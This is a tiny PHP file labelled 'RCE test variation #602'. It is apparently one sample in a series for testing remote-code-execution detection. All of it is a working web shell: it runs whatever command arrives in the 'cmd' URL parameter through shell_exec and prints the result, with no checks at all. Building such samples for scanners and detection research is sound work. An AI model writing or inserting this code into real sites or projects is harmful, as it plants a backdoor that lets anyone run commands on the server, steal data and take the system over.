<?php
// RCE test variation #602
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>